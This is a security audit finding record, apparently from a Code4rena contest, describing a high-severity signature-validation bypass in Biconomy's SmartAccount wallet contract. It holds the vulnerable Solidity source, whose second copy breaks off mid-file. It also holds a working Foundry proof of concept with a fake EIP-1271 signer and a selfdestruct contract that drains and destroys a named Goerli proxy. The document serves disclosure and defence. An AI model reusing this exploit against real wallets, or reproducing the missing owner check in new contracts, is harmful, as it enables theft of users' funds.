{
  "Title": "[H-04] Arbitrary transactions possible due to insufficient signature validation",
  "Content": "\nA hacker can create arbitrary transaction through the smart wallet by evading signature validation.\n\nMajor impacts:\n\n1.  Steal **all** funds from the smart wallet and destroy the proxy\n2.  Lock the wallet from EOAs by updating the implementation contract\n    1.  New implementation can transfer all funds or hold some kind of ransom\n    2.  New implementation can take time to unstake funds from protocols\n\n### Proof of Concept\n\nThe protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction:<br>\n[contracts/smart-contract-wallet/SmartAccount.sol#L218](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218)<br>\n[contracts/smart-contract-wallet/SmartAccount.sol#L342](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342)\n\n\n    function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) public payable virtual override returns (bool success) {\n    ---------\n                checkSignatures(txHash, txHashData, signatures);\n            }\n    ---------\n                success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n    ---------\n            }\n        }\n\n    function checkSignatures(\n            bytes32 dataHash,\n            bytes memory data,\n            bytes memory signatures\n        ) public view virtual {\n    ----------\n            if(v == 0) {\n    ----------\n                _signer = address(uint160(uint256(r)));\n    ----------\n                    require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n    ----------\n                    require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n    -----------\n                    assembly {\n                        contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                    }\n                    require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n    -----------\n                    require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n    -----------\n        }\n\n`checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract.\n\nA hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.\n\nAs `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.\n\n**Impact #1 - Self destruct and steal all funds**\n\nConsider the following scenario:\n\n1.  Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n2.  Hacker creates `SelfDestructingContract` that `selfdestruct`s when called\n3.  Hacker calls the smart wallets `execTransaction` function\n    1.  The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`\n    2.  The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n4.  Proxy contract is destroyed\n    1.  Hacker received all funds that were in the wallet\n\n**Impact #2 - Update implementation and lock out EOA**\n\n1.  Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n2.  Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker\n3.  Hacker calls the smart wallets `execTransaction` function\n    1.  The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)`\n    2.  The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n4.  Implementation was updated to `MaliciousImplementation`\n    1.  Hacker transfers all native and ERC20 tokens to himself\n    2.  Hacker unstakes EOA funds from protocols\n    3.  Hacker might try to ransom the protocol/EOAs to return to previous implementation\n5.  Proxy cannot be redeployed for the existing EOA\n\n**Foundry POC**\n\nThe POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.\n\nThe POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.\n\nThe POC use a smart wallet proxy contract that is deployed on `goerli` chain:<br>\n`proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09`\n\nYou will need to install a foundry. Please follow these instruction for the setup: <https://book.getfoundry.sh/getting-started/installation>\n\nAfter installing, create a workdir by issuing the command: `forge init --no-commit`\n\nCreate the following file in `test/DestroyWalletAndStealFunds.t.sol`:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n\n    contract Enum {\n        enum Operation {Call, DelegateCall}\n    }\n    interface SmartAccount {\n        function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) external payable returns (bool success); \n        function getNonce(uint256 batchId) external view returns (uint256);\n    }\n    struct Transaction {\n            address to;\n            uint256 value;\n            bytes data;\n            Enum.Operation operation;\n            uint256 targetTxGas;\n        }\n    struct FeeRefund {\n            uint256 baseGas;\n            uint256 gasPrice; //gasPrice or tokenGasPrice\n            uint256 tokenGasPriceFactor;\n            address gasToken;\n            address payable refundReceiver;\n        }\n    contract FakeSigner {\n        bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;\n\n        // Always return valid EIP1271_MAGIC_VALUE\n        function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {\n            return EIP1271_MAGIC_VALUE;\n        }\n    }\n    contract SelfDestructingContract {\n        // All this does is self destruct and send funds to \"to\"\n        function selfDestruct(address to) external {\n            selfdestruct(payable(to));\n        }\n    }\n\n    contract DestroyWalletAndStealFunds is Test {\n        SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);\n        address hacker = vm.addr(0x1337);\n        SelfDestructingContract sdc;\n        FakeSigner fs;\n        function setUp() public {\n            // Create self destruct contract\n            sdc = new SelfDestructingContract();\n            // Create fake signer\n            fs = new FakeSigner();\n\n            // Impersonate hacker\n            vm.startPrank(hacker);\n            // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker \n            bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);\n            // Create transaction specifing SelfDestructingContract as target and as a delegate call\n            Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);\n            // Create FeeRefund\n            FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));\n\n            bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));\n            // Add fake signature (r,s,v) to pass all requirments.\n            // v=0 to indicate eip-1271 signer \"fakeSignerPadded\" which will always return true\n            bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));\n            // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.\n            proxySmartAccount.execTransaction(transaction, 0, fr, signatures);\n            vm.stopPrank();\n        }\n\n        function testProxyDoesNotExist() public {\n            uint size;\n            // Validate that bytecode size of the proxy contract is 0 becuase of self destruct \n            address proxy = address(proxySmartAccount);\n            assembly {\n              size := extcodesize(proxy)\n            }\n            assertEq(size,0);\n        }\n\n        function testRevertWhenCallingWalletThroughProxy() public {\n            // Revert when trying to call a function in the proxy \n            proxySmartAccount.getNonce(0);\n        }\n    }\n\nTo run the POC and validate that the proxy does not exist after destruction:\n\n    forge test -m testProxyDoesNotExist -v --fork-url=\"<GOERLI FORK RPC>\"\n\nExpected output:\n\n    Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    [PASS] testProxyDoesNotExist() (gas: 4976)\n    Test result: ok. 1 passed; 0 failed; finished in 4.51s\n\nTo run the POC and validate that the EOA cannot interact with the wallet after destruction:\n\n    forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url=\"<GOERLI FORK RPC>\"\n\nExpected output:\n\n    Failing tests:\n    Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    [FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)\n\n### Tools Used\n\nFoundry, VS Code\n\n### Recommended Mitigation Steps\n\nThe protocol should validate before calling `isValidSignature` that `_signer` is `owner`.\n\n**[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/175#issuecomment-1397655516)**\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-01-biconomy-smart-contract-wallet-contest",
  "Code": [
    {
      "filename": "scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n    function handlePaymentRevert(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) external returns (uint256 payment) {\n        uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hpr %s\", requiredGas);\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n            // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n                // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n                require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n                uint256 contractSignatureLen;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                }\n                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n                // Check signature\n                bytes memory contractSignature;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n                    contractSignature := add(add(signatures, s), 0x20)\n                }\n                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n        }\n        else if(v > 30) {\n            // If v > 30 then default va (27,28) has been adjusted for eth_sign flow\n            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n            _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        } else {\n            _signer = ecrecover(dataHash, v, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        }\n    }\n\n    /// @dev Allows to estimate a transaction.\n    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n    /// @param to Destination address of Safe transaction.\n    /// @param value Ether value of transaction.\n    /// @param data Data payload of transaction.\n    /// @param operation Operation type of transaction.\n    /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n    function requiredTxGas(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation\n    ) external returns (uint256) {\n        uint256 startGas = gasleft();\n        // We don't provide an error message here, as we use it to return the estimate\n        require(execute(to, value, data, operation, gasleft()));\n        uint256 requiredGas = startGas - gasleft();\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /// @dev Returns hash to be signed by owner.\n    /// @param to Destination address.\n    /// @param value Ether value.\n    /// @param data Data payload.\n    /// @param operation Operation type.\n    /// @param targetTxGas Fas that should be used for the safe transaction.\n    /// @param baseGas Gas costs for data used to trigger the safe transaction.\n    /// @param gasPrice Maximum gas price that should be used for this transaction.\n    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash.\n    function getTransactionHash(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 targetTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver,\n        uint256 _nonce\n    ) public view returns (bytes32) {\n        Transaction memory _tx = Transaction({\n            to: to,\n            value: value,\n            data: data,\n            operation: operation,\n            targetTxGas: targetTxGas\n        });\n        FeeRefund memory refundInfo = FeeRefund({\n            baseGas: baseGas,\n            gasPrice: gasPrice,\n            tokenGasPriceFactor: tokenGasPriceFactor,\n            gasToken: gasToken,\n            refundReceiver: refundReceiver\n        });\n        return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n    }\n\n    /// @dev Returns the bytes that are hashed to be signed by owner.\n    /// @param _tx Wallet transaction \n    /// @param refundInfo Required information for gas refunds\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash bytes.\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n    // Extra Utils \n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n\n    function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n        IERC20 tokenContract = IERC20(token);\n        SafeERC20.safeTransfer(tokenContract, dest, amount);\n    }\n\n    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        _call(dest, value, func);\n    }\n\n    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        require(dest.length == func.length, \"wrong array lengths\");\n        for (uint i = 0; i < dest.length;) {\n            _call(dest[i], 0, func[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    // AA implementation\n    function _call(address target, uint256 value, bytes memory data) internal {\n        (bool success, bytes memory result) = target.call{value : value}(data);\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n    }\n    \n    //called by entryPoint, only after validateUserOp succeeded.\n    //@review\n    //Method is updated to instruct delegate call and emit regular events\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n        success = execute(dest, value, func, operation, gasLimit);\n        require(success, \"Userop Failed\");\n    }\n\n    function _requireFromEntryPointOrOwner() internal view {\n        require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n    }\n\n    /// implement template method of BaseAccount\n    // @notice Nonce space is locked to 0 for AA transactions\n    // userOp could have batchId as well\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {\n        require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n    }\n\n    /// implement template method of BaseAccount\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)\n    internal override virtual returns (uint256 deadline) {\n        bytes32 hash = userOpHash.toEthSignedMessageHash();\n        //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n        // solhint-disable-next-line avoid-tx-origin\n        require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n        return 0;\n    }\n\n    /**\n     * check current account deposit in the entryPoint\n     */\n    function getDeposit() public view returns (uint256) {\n        return entryPoint().balanceOf(address(this));\n    }\n\n    /**\n     * deposit more funds for this account in the entryPoint\n     */\n    function addDeposit() public payable {\n\n        (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n        require(req);\n    }\n\n    /**\n     * withdraw value from the account's deposit\n     * @param withdrawAddress target to send to\n     * @param amount to withdraw\n     */\n    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n        entryPoint().withdrawTo(withdrawAddress, amount);\n    }\n\n    /**\n     * @notice Query if a contract implements an interface\n     * @param interfaceId The interface identifier, as specified in ERC165\n     * @return `true` if the contract implements `_interfaceID`\n    */\n    function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7\n    }\n\n    // solhint-disable-next-line no-empty-blocks\n    receive() external payable {}\n}"
    },
    {
      "filename": "scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint 